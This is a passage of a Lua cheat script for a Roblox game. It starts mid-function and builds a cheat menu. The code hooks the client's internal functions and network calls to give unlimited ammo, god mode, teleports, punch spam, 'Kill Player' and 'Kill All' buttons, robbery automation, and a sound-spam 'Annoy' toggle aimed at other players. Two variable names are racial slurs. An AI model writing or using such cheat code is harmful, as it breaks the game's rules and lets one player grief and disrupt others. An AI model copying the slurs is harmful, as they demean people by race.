	client.rocketlanucher.InputBegan = function(peepee, pepe)
		pcall(function()
			if client.toggles["Gun Mod"] and pepe.UserInputType == Enum.UserInputType.MouseButton1 then 
				peepee.AmmoCurrent = 100
				peepee.FireLast = 0
				peepee.SpringRotation.Accelerate = function() end
				peepee.SpringOffset.Accelerate = function() end
				toloop = true
				spawn(function() 
					if not toloop then return end
					if not isrbxactive() then return end
					client.rocketlanucher.InputBegan(peepee, pepe)
				end)
			end
			return oldnigger(peepee, pepe)
		end)
	end
	UIS.InputEnded:connect(function(input, gameprocced)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			if toloop then -- just to make sure you really released the mouse with the rocket launcher
				toloop = false
			end
		end
	end)
	for i,v in next, debug.getupvalues(client.a.Register) do 
		client.basic = v.Basic
		break
	end
	local oldinputbeganbasic = client.basic.InputBegan
	local toloop2 = false
	client.basic.InputBegan = function(himan, nugger) 
		pcall(function()
			if himan.Name == "Taser" then 
				if client.toggles["Gun Mod"] then 
					himan.UseNext = 0
					toloop2 = true
					spawn(function()
						if not toloop2 then return end
						client.basic.InputBegan(himan, nugger)
					end)
				end
			end
			return oldinputbeganbasic(himan, nugger)
		end)
	end
	UIS.InputEnded:connect(function(input, gameprocced)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			if toloop2 then
				toloop2 = false
			end
		end
	end)
	spawn(function()
		while wait() do
			if client.toggles["Annoy"] then
				pcall(function()
					client.playsound("FireworkBang", {
						Source = game.Players.LocalPlayer.Character.PrimaryPart,
						Volume = math.huge,
						Multi = true
					})
				end)
			end
		end
	end)
	spawn(function() 
		while wait() do 
			if client.toggles["Heal"] then 
				API:Heal()
			end
		end 
	end)
	API.ToggleGunMod = function(self, toggle) 
		client.toggles["Gun Mod"] = toggle
	end
	API.ToggleAnnoy = function(self, toggle) 
		client.toggles["Annoy"] = toggle
	end
	API.BreakCrash = function() 
		client.breakcrash = true
		wait(0.30)
		client.breakcrash = false
	end
	debug.setupvalue(client.network.FireServer, funcname, function(hash, eh, thetabl, ...)
		if hash == client.remotes.Punch and client.toggles["Punch"] then
			for i = 1, 20 do backup(hash, eh, thetabl, ...) end
		end
		if hash == client.remotes.EnableParaglide and checkcaller() then
			client.toggles["Hide Tp"] = true
		end
		if hash == client.remotes.DisableParaglide and checkcaller() then
			coroutine.resume(coroutine.create(function() 
				wait(0.30)
				backup(hash)
				client.toggles["Hide Tp"] = false
			end))
		else
			return backup(hash, eh, thetabl, ...)
		end
	end)
end
local settings = {
    ["Punch Spam"] = false,
	["God Mode"] = false,
	["No Wait"] = false,
	["Click Fire"] = false,
	["Click Teleport"] = false,
	["Fire Trail"] = false
}
spawn(function() 
    while wait() do 
        if settings["Punch Spam"] then 
            API:Punch()
        end
        if settings["God Mode"] then 
            API:Heal()
		end
		if settings["No Wait"] then 
			API:NoWait()
		end
		if settings["Fire Trail"] then 
			API:SpawnFire(game.Players.LocalPlayer.Character.PrimaryPart.Position)
		end
    end
end)
local Hacks = ui:CreateTab("Main")
local localplayer = Hacks:AddSection("Local Cheats")
localplayer:AddToggle("Punch Spam", function(toggle) 
    settings["Punch Spam"] = toggle
end)
localplayer:AddToggle("Ragdoll Bypass", function() 
    API:ToggleRagdollBypass()
end)
localplayer:AddToggle("God Mode", function(toggle) 
    settings["God Mode"] = toggle
end)
localplayer:AddToggle("No Wait", function(toggle) 
    settings["No Wait"] = toggle
end)
localplayer:AddToggle("Click Fire", function(toggle) 
    settings["Click Fire"] = toggle
end)
localplayer:AddToggle("Click Teleport", function(toggle) 
    settings["Click Teleport"] = toggle
end)
localplayer:AddToggle("Fire Trail", function(toggle) 
    settings["Fire Trail"] = toggle
end)
localplayer:AddToggle("Gun Mod", function(toggle) 
	API:ToggleGunMod(toggle)
end)
localplayer:AddButton("Pickpocket", function() 
    API:GrabKeyCard()
end)
localplayer:AddButton("Give JetPack", function() 
	API:GetJetPack()
end)
localplayer:AddButton("Inf Fuel", function() 
	API:InfFuel()
end)
local playeractions = Hacks:AddSection("Player Actions")
playeractions:AddBox("Kill Player", "", function(text, d) 
    if d then
        API:KillPlayer(text.Text)
    end
end)
playeractions:AddBox("Tp To Player", "", function(text, d) 
    if d then
        API:TpToPlayer(text.Text)
    end
end)
playeractions:AddButton("Kill All", function() 
	for i,v in next, game.Players:GetPlayers() do 
		if v.Name ~= game.Players.LocalPlayer.Name then 
			API:KillPlayer(v.Name)
		end
	end
end)
function tp(name) 
	for i, v in next, locations do
		for i2, v2 in next, v do 
			if v2[1] == name then 
				API:Teleport(v2[2])
			end
		end
	end
end
local teleports = Hacks:AddSection("Teleports")
for i, v in next, locations do
	local array = {}
	for i2, v2 in next, v do 
		table.insert(array, v2[1])
	end
	teleports:AddDropdown(i, array, function(selected) 
		tp(selected)
	end)
end
local robberies = Hacks:AddSection("Robberies")
robberies:AddButton("Small Stores", function() API:RobSmallStore() end)
local UIS = game:GetService("UserInputService")
local mouse = game:GetService("Players").LocalPlayer:GetMouse();
UIS.InputBegan:connect(function(input, gameprocced)
    if not gameprocced then
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            if settings["Click Fire"] then
                API:SpawnFire(mouse.Hit.p)
            end
        end
    end
end)
UIS.InputBegan:connect(function(input, gameprocced)
    if not gameprocced then
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            if settings["Click Teleport"] then
                API:Teleport(CFrame.new(mouse.Hit.p.X, mouse.Hit.p.Y, mouse.Hit.p.Z))
            end
        end
    end
end)
local exploits = ui:CreateTab("Exploits")
local cars = exploits:AddSection("Cars")
cars:AddButton("Inf Nitro Server Side", function() 
	API:InfNitroServerSide()
end)
cars:AddButton("Mobile Garage", function() 
	API:MobileGarage()
end)
local serverexploits = exploits:AddSection("Server")
serverexploits:AddToggle("Annoy", function(toggle) 
	API:ToggleAnnoy(toggle)
end)
API:Firework()